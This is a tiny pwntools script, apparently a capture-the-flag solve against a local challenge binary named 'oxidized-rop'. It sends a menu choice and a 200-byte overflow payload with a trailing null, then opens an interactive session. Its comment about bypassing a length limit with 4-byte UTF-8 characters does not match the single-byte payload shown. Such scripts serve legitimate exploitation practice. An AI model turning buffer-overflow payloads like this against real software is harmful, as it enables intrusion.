from pwn import *
r = process('./oxidized-rop')
# use utf-8 4 bytes characters to bypass the length limit since rust stores strings as utf-8
r.sendline(b'1')
r.sendline(b'a'*200+b'\x00')
r.interactive()

